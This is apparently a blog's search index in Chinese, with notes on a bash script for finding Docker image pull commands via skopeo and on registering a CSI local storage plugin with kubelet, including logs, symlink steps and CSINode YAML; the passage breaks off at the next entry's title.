<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>【docker系列】(202506) docker查找某个镜像的某个tag的具体拉取命令</title>
    <link href="/2025/06/11/docker/%E3%80%90docker%E7%B3%BB%E5%88%97%E3%80%91(202506)%20docker%E6%9F%A5%E6%89%BE%E6%9F%90%E4%B8%AA%E9%95%9C%E5%83%8F%E7%9A%84%E6%9F%90%E4%B8%AAtag%E7%9A%84%E5%85%B7%E4%BD%93%E6%8B%89%E5%8F%96%E5%91%BD%E4%BB%A4/"/>
    <url>/2025/06/11/docker/%E3%80%90docker%E7%B3%BB%E5%88%97%E3%80%91(202506)%20docker%E6%9F%A5%E6%89%BE%E6%9F%90%E4%B8%AA%E9%95%9C%E5%83%8F%E7%9A%84%E6%9F%90%E4%B8%AAtag%E7%9A%84%E5%85%B7%E4%BD%93%E6%8B%89%E5%8F%96%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>想要在docker.io里面查找某个镜像的某个tag，并且把具体的命令打印出来</p><h1 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h1><p>目前没有办法确定是否是双架构</p><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># 镜像列表（格式：镜像名:标签）</span><br>images=(<br>  <span class="hljs-comment"># &quot;nginx:1.21&quot;</span><br>  <span class="hljs-comment"># &quot;redis:7.0.0&quot;</span><br>  <span class="hljs-comment"># &quot;node:20.11&quot;</span><br>  <span class="hljs-comment"># &quot;notexistimage:1.0&quot;</span><br><br>  <span class="hljs-comment"># csi-resizer:v1.8.0</span><br>  <span class="hljs-comment"># csi-snapshotter:v6.2.2</span><br>  <span class="hljs-comment"># snapshot-controller:v6.2.2</span><br>  <span class="hljs-comment"># csi-provisioner:v3.5.0</span><br>  <span class="hljs-comment"># csi-node-driver-registrar:v2.8.0</span><br>  <span class="hljs-comment"># lvm-driver:1.4.0</span><br><br>  <span class="hljs-comment"># lvm-driver:1.6.1</span><br><br>  openebs/tests-fio<br>)<br><br><span class="hljs-keyword">for</span> image <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;images[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>  name=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;image%%:*&#125;</span>&quot;</span><br>  tag=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;image##*:&#125;</span>&quot;</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;🔍 正在查找镜像 <span class="hljs-variable">$&#123;name&#125;</span>:<span class="hljs-variable">$&#123;tag&#125;</span> ...&quot;</span><br><br>  namespaced_name=$(docker search <span class="hljs-variable">$name</span> |grep -v <span class="hljs-string">&quot;NAME&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br><br>  <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-variable">$namespaced_name</span>; <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;  ★★ 正在查找镜像 skopeo list-tags docker://docker.io/<span class="hljs-variable">$item</span> |grep <span class="hljs-variable">$tag</span> ...&quot;</span><br>    found=$(skopeo list-tags docker://docker.io/<span class="hljs-variable">$item</span> |grep <span class="hljs-variable">$tag</span>)<br>    <span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span><br>      <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;    ✅ docker pull <span class="hljs-variable">$item</span>:<span class="hljs-variable">$tag</span>&quot;</span> <br>    <span class="hljs-keyword">fi</span><br>  <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(202506) csi本地存储插件</title>
    <link href="/2025/06/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202506)%20csi%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%E6%8F%92%E4%BB%B6lvm-localpv/"/>
    <url>/2025/06/06/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202506)%20csi%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%E6%8F%92%E4%BB%B6lvm-localpv/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20250606171438.png" alt="image.png"></p><p>1.csi插件生成<code>/var/lib/kubelet/plugins/&lt;driver&gt;/csi.sock</code><br>2.<code>node-driver-registrar</code> 组件会将 CSI 插件的信息注册到：<code>/var/lib/kubelet/plugins_registry/</code> 中<br>3.<code>kubelet</code> 发现了这个注册信息之后，就会尝试通过 socket 主动连接插件，并调用多个标准 gRPC 接口：例如<code>NodeGetInfo</code><br>4.kubelet 根据 <code>NodeGetInfo</code> 的返回，<strong>创建或更新 <code>CSINode</code> 对象</strong>，用于调度决策（比如拓扑感知调度）。</p><h1 id="实践1：用kubelet配置的目录信息"><a href="#实践1：用kubelet配置的目录信息" class="headerlink" title="实践1：用kubelet配置的目录信息"></a>实践1：用kubelet配置的目录信息</h1><p>实践时发现，kubelet会有如下日志：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>月 <span class="hljs-number">06</span> <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span> kubelet[<span class="hljs-number">3225884</span>]: I0606 <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span>.<span class="hljs-number">955007</span> <span class="hljs-number">3225884</span> csi_plugin.go:<span class="hljs-number">99</span>] kubernetes.io/csi: Trying to validate a new CSI Driver with name: &lt;driverName&gt; endpoint: /xxx/plugins/&lt;driverName&gt;/csi.sock versions: <span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>以二进制方式部署的lvm-localpv有如下日志：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>月 <span class="hljs-number">06</span> <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span> localpv[<span class="hljs-number">3209981</span>]: I0606 <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span>.<span class="hljs-number">955959</span> <span class="hljs-number">3209981</span> grpc.go:<span class="hljs-number">72</span>] GRPC call: /csi.v1.Node/NodeGetInfo requests &#123;&#125;<br><span class="hljs-attribute">6</span>月 <span class="hljs-number">06</span> <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span> cdp-<span class="hljs-number">10</span>-<span class="hljs-number">191</span>-<span class="hljs-number">193</span>-<span class="hljs-number">6</span> localpv[<span class="hljs-number">3209981</span>]: I0606 <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span>.<span class="hljs-number">960667</span> <span class="hljs-number">3209981</span> grpc.go:<span class="hljs-number">81</span>] GRPC response: &#123;<span class="hljs-string">&quot;accessible_topology&quot;</span>:&#123;<span class="hljs-string">&quot;segments&quot;</span>:&#123;<span class="hljs-string">&quot;openebs.io/nodename&quot;</span>:<span class="hljs-string">&quot;node0&quot;</span>&#125;&#125;,<span class="hljs-string">&quot;node_id&quot;</span>:<span class="hljs-string">&quot;node0&quot;</span>&#125;<br><br></code></pre></td></tr></table></figure><p>然后csinode确实更新了</p><p>然后node的annotation也确实更新了</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Node</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-attr">csi.volume.kubernetes.io/nodeid:</span> <span class="hljs-string">&#x27;&#123;&quot;&lt;driverName&gt;&quot;:&quot;node0&quot;,&quot;&lt;anotherDriverName&gt;&quot;:&quot;xxx&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="实践2：用kubelet配置的目录信息"><a href="#实践2：用kubelet配置的目录信息" class="headerlink" title="实践2：用kubelet配置的目录信息"></a>实践2：用kubelet配置的目录信息</h1><p>1.删除<code>/xxx/plugins/&lt;driverName&gt;/csi.sock</code><br>node的annotation信息还在<br>csinode上的信息也还在<br>2.在1的基础上，删除&#96;&#x2F;xxx&#x2F;plugins_registry&#x2F;<driverName>-reg.sock<br>node的annotation信息被删了<br>csinode上的信息也被删了<br>但是，是谁删的呢？没在kubelet上看到相关日志</p><h1 id="实践3：用自定义的目录信息"><a href="#实践3：用自定义的目录信息" class="headerlink" title="实践3：用自定义的目录信息"></a>实践3：用自定义的目录信息</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>localpv进程和node-driver-registrar进程不想使用kubelet进程配置的目录，想使用自定义的目录</p><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">ll /vdata/storage/plugins   空<br>ll /vdata/storage/plugins_registry  空<br><br>ll /xxx/plugins            xxx为kubelet进程配置里面的 空<br>ll /xxx/plugins_registry   xxx为kubelet进程配置里面的 空<br><br>node的annotation没有driver信息<br>csinode的spec下没有driver信息<br><br>localpv进程连接/vdata/storage相关目录<br>node-driver-registrar进程连接/vdata/storage相关目录<br></code></pre></td></tr></table></figure><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>1.重启主机上的localpv进程<br><code>/vdata/storage/plugins/&lt;driverName&gt;/csi.sock</code> 自动生成</p><p>2.重启主机上的<code>node-driver-registrar</code>进程<br><code>/vdata/storage/plugins_registry/&lt;driverName&gt;-reg.sock</code>自动生成</p><p>3.创建软链接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /vdata/storage/plugins_registry/&lt;driverName&gt;-reg.sock /xxx/plugins_registry/&lt;driverName&gt;-reg.sock<br></code></pre></td></tr></table></figure><p><font color="red">未重启kubelet</font></p><p>此时，kubelet打印处日志：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>月 <span class="hljs-number">06</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">45</span> kubelet[<span class="hljs-number">3225884</span>]: I0606 <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">45</span>.<span class="hljs-number">956052</span> <span class="hljs-number">3225884</span> csi_plugin.go:<span class="hljs-number">99</span>] kubernetes.io/csi: Trying to validate a new CSI Driver with name: &lt;driverName&gt; endpoint: /vdata/storage/plugins/local.csi.paas.cucloud/csi.sock versions: <span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>locallv进程的日志：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>月 <span class="hljs-number">06</span> <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span> localpv[<span class="hljs-number">3209981</span>]: I0606 <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span>.<span class="hljs-number">955959</span> <span class="hljs-number">3209981</span> grpc.go:<span class="hljs-number">72</span>] GRPC call: /csi.v1.Node/NodeGetInfo requests &#123;&#125;<br><span class="hljs-attribute">6</span>月 <span class="hljs-number">06</span> <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span> localpv[<span class="hljs-number">3209981</span>]: I0606 <span class="hljs-number">16</span>:<span class="hljs-number">47</span>:<span class="hljs-number">57</span>.<span class="hljs-number">960667</span> <span class="hljs-number">3209981</span> grpc.go:<span class="hljs-number">81</span>] GRPC response: &#123;<span class="hljs-string">&quot;accessible_topology&quot;</span>:&#123;<span class="hljs-string">&quot;segments&quot;</span>:&#123;<span class="hljs-string">&quot;openebs.io/nodename&quot;</span>:<span class="hljs-string">&quot;node0&quot;</span>&#125;&#125;,<span class="hljs-string">&quot;node_id&quot;</span>:<span class="hljs-string">&quot;node0&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>node-driver-registrar进程的日志：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>月 <span class="hljs-number">06</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">45</span> node-driver-registrar[<span class="hljs-number">3342604</span>]: I0606 <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">45</span>.<span class="hljs-number">955789</span> <span class="hljs-number">3342604</span> main.go:<span class="hljs-number">98</span>] <span class="hljs-string">&quot;Received GetInfo call&quot;</span> request=<span class="hljs-string">&quot;&amp;InfoRequest&#123;&#125;&quot;</span><br><span class="hljs-attribute">6</span>月 <span class="hljs-number">06</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">46</span> node-storage-driver-registrar[<span class="hljs-number">3342604</span>]: I0606 <span class="hljs-number">18</span>:<span class="hljs-number">16</span>:<span class="hljs-number">46</span>.<span class="hljs-number">000749</span> <span class="hljs-number">3342604</span> main.go:<span class="hljs-number">110</span>] <span class="hljs-string">&quot;Received NotifyRegistrationStatus call&quot;</span> status=<span class="hljs-string">&quot;&amp;RegistrationStatus&#123;PluginRegistered:true,Error:,&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>csinode上的信息有了</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">storage.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">CSINode</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">node0</span><br>  <span class="hljs-attr">ownerReferences:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br>    <span class="hljs-attr">kind:</span> <span class="hljs-string">Node</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">node0</span><br>    <span class="hljs-attr">uid:</span> <span class="hljs-string">c7a8993b-40ab-4641-849f-6ac40d8a6750</span><br>  <span class="hljs-attr">resourceVersion:</span> <span class="hljs-string">&quot;33527&quot;</span><br>  <span class="hljs-attr">uid:</span> <span class="hljs-string">7ac73448-c503-40b6-bed4-90a3285619da</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">drivers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">&lt;driverName&gt;</span><br>    <span class="hljs-attr">nodeID:</span> <span class="hljs-string">node0</span><br>    <span class="hljs-attr">topologyKeys:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">openebs.io/nodename</span><br></code></pre></td></tr></table></figure><p>node的annotation信息也有了</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Node</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-attr">csi.volume.kubernetes.io/nodeid:</span> <span class="hljs-string">&#x27;&#123;&quot;&lt;driverName&gt;&quot;:&quot;node0&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="实践4：用自定义的目录信息"><a href="#实践4：用自定义的目录信息" class="headerlink" title="实践4：用自定义的目录信息"></a>实践4：用自定义的目录信息</h1><h2 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h2><p>localpv进程和node-driver-registrar进程不想使用kubelet进程配置的目录，想使用自定义的目录</p><h2 id="前提条件-1"><a href="#前提条件-1" class="headerlink" title="前提条件"></a>前提条件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">ll /vdata/storage/plugins   空<br>ll /vdata/storage/plugins_registry  空<br><br>ll /xxx/plugins            xxx为kubelet进程配置里面的 空<br>ll /xxx/plugins_registry   xxx为kubelet进程配置里面的 空<br><br>node的annotation没有driver信息<br>csinode的spec下没有driver信息<br><br>localpv进程连接/vdata/storage相关目录<br>node-driver-registrar进程连接/vdata/storage相关目录<br></code></pre></td></tr></table></figure><h2 id="快捷命令"><a href="#快捷命令" class="headerlink" title="快捷命令"></a>快捷命令</h2><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">systemctl</span> <span class="hljs-built_in">list-units</span> |<span class="hljs-string">grep</span> <span class="hljs-string">storage</span><br></code></pre></td></tr></table></figure><h2 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h2><p>1.重启主机上的<code>node-driver-registrar</code>进程<br>该进程连不上csi.sock  一直在重启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">6月 09 09:55:32 node-driver-registrar[2035069]: I0609 09:55:32.340043 2035069 main.go:152] <span class="hljs-string">&quot;Version&quot;</span> version=<span class="hljs-string">&quot;v0.0.1&quot;</span><br>6月 09 09:55:32 node-driver-registrar[2035069]: I0609 09:55:32.340128 2035069 main.go:153] <span class="hljs-string">&quot;Running node-driver-registrar&quot;</span> mode=<span class="hljs-string">&quot;&quot;</span><br>6月 09 09:55:32 node-driver-registrar[2035069]: I0609 09:55:32.340156 2035069 main.go:175] <span class="hljs-string">&quot;Created directory for pluginRegistrationPath successfully&quot;</span> pluginRegistrationPath=<span class="hljs-string">&quot;/vdata/storage/plugins_registry/&quot;</span><br>6月 09 09:55:32 node-driver-registrar[2035069]: I0609 09:55:32.340176 2035069 main.go:181] <span class="hljs-string">&quot;Attempting to open a gRPC connection&quot;</span> csiAddress=<span class="hljs-string">&quot;/vdata/storage/plugins/&lt;driverName&gt;/csi.sock&quot;</span><br>6月 09 09:55:32 node-driver-registrar[2035069]: I0609 09:55:32.340211 2035069 connection.go:234] <span class="hljs-string">&quot;Connecting&quot;</span> address=<span class="hljs-string">&quot;unix:///vdata/storage/plugins/&lt;driverName&gt;/csi.sock&quot;</span><br>6月 09 09:55:42 node-driver-registrar[2035069]: I0609 09:55:42.340927 2035069 connection.go:253] <span class="hljs-string">&quot;Still connecting&quot;</span> address=<span class="hljs-string">&quot;unix:///vdata/storage/plugins/&lt;driverName&gt;/csi.sock&quot;</span><br>6月 09 09:55:52 node-driver-registrar[2035069]: I0609 09:55:52.340933 2035069 connection.go:253] <span class="hljs-string">&quot;Still connecting&quot;</span> address=<span class="hljs-string">&quot;unix:///vdata/storage/plugins/&lt;driverName&gt;/csi.sock&quot;</span><br>6月 09 09:56:02 node-driver-registrar[2035069]: I0609 09:56:02.340838 2035069 connection.go:253] <span class="hljs-string">&quot;Still connecting&quot;</span> address=<span class="hljs-string">&quot;unix:///vdata/storage/plugins/&lt;driverName&gt;/csi.sock&quot;</span><br>6月 09 09:56:02 node-driver-registrar[2035069]: E0609 09:56:02.340965 2035069 main.go:185] <span class="hljs-string">&quot;Error connecting to CSI driver&quot;</span> err=<span class="hljs-string">&quot;context deadline exceeded&quot;</span><br>6月 09 09:56:02 systemd[1]: node-driver-registrar.service: Main process exited, code=exited, status=1/FAILURE<br><br></code></pre></td></tr></table></figure><p>2.重启主机上的localpv进程<br><code>/vdata/storage/plugins/&lt;driverName&gt;/csi.sock</code> 自动生成</p><p><code>node-driver-registrar</code>进程正常启动，不会再退出了<br><code>/vdata/storage/plugins_registry/&lt;driverName&gt;-reg.sock</code>自动生成</p><p>3.创建软链接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /vdata/storage/plugins_registry/&lt;driverName&gt;-reg.sock /xxx/plugins_registry/&lt;driverName&gt;-reg.sock<br></code></pre></td></tr></table></figure><p><font color="red">未重启kubelet</font></p><p>此时，kubelet打印处日志：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>月 <span class="hljs-number">09</span> <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span> kubelet[<span class="hljs-number">3225884</span>]: I0609 <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span>.<span class="hljs-number">064767</span> <span class="hljs-number">3225884</span> csi_plugin.go:<span class="hljs-number">99</span>] kubernetes.io/csi: Trying to validate a new CSI Driver with name: &lt;driverName&gt; endpoint: /vdata/storage/plugins/&lt;driverName&gt;/csi.sock versions: <span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure><p>locallv进程的日志：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>月 <span class="hljs-number">09</span> <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span> localpv[<span class="hljs-number">2443179</span>]: I0609 <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span>.<span class="hljs-number">066717</span> <span class="hljs-number">2443179</span> grpc.go:<span class="hljs-number">72</span>] GRPC call: /csi.v1.Node/NodeGetInfo requests &#123;&#125;<br><span class="hljs-attribute">6</span>月 <span class="hljs-number">09</span> <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span> localpv[<span class="hljs-number">2443179</span>]: I0609 <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span>.<span class="hljs-number">073840</span> <span class="hljs-number">2443179</span> grpc.go:<span class="hljs-number">81</span>] GRPC response: &#123;<span class="hljs-string">&quot;accessible_topology&quot;</span>:&#123;<span class="hljs-string">&quot;segments&quot;</span>:&#123;<span class="hljs-string">&quot;openebs.io/nodename&quot;</span>:<span class="hljs-string">&quot;node0&quot;</span>&#125;&#125;,<span class="hljs-string">&quot;node_id&quot;</span>:<span class="hljs-string">&quot;node0&quot;</span>&#125;<br><br></code></pre></td></tr></table></figure><p>node-driver-registrar进程的日志：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">6</span>月 <span class="hljs-number">09</span> <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span> node-driver-registrar[<span class="hljs-number">2447943</span>]: I0609 <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span>.<span class="hljs-number">064271</span> <span class="hljs-number">2447943</span> main.go:<span class="hljs-number">98</span>] <span class="hljs-string">&quot;Received GetInfo call&quot;</span> request=<span class="hljs-string">&quot;&amp;InfoRequest&#123;&#125;&quot;</span><br><span class="hljs-attribute">6</span>月 <span class="hljs-number">09</span> <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span> node-driver-registrar[<span class="hljs-number">2447943</span>]: I0609 <span class="hljs-number">10</span>:<span class="hljs-number">02</span>:<span class="hljs-number">14</span>.<span class="hljs-number">116255</span> <span class="hljs-number">2447943</span> main.go:<span class="hljs-number">110</span>] <span class="hljs-string">&quot;Received NotifyRegistrationStatus call&quot;</span> status=<span class="hljs-string">&quot;&amp;RegistrationStatus&#123;PluginRegistered:true,Error:,&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>csinode上的信息有了</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">storage.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">CSINode</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">node0</span><br>  <span class="hljs-attr">ownerReferences:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br>    <span class="hljs-attr">kind:</span> <span class="hljs-string">Node</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">node0</span><br>    <span class="hljs-attr">uid:</span> <span class="hljs-string">c7a8993b-40ab-4641-849f-6ac40d8a6750</span><br>  <span class="hljs-attr">resourceVersion:</span> <span class="hljs-string">&quot;33527&quot;</span><br>  <span class="hljs-attr">uid:</span> <span class="hljs-string">7ac73448-c503-40b6-bed4-90a3285619da</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">drivers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">&lt;driverName&gt;</span><br>    <span class="hljs-attr">nodeID:</span> <span class="hljs-string">node0</span><br>    <span class="hljs-attr">topologyKeys:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">openebs.io/nodename</span><br></code></pre></td></tr></table></figure><p>node的annotation信息也有了</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Node</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-attr">csi.volume.kubernetes.io/nodeid:</span> <span class="hljs-string">&#x27;&#123;&quot;&lt;driverName&gt;&quot;:&quot;node0&quot;&#125;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【containerd】(202411) 09.如何找到某个容器文件系统在主机上的映射？</title>
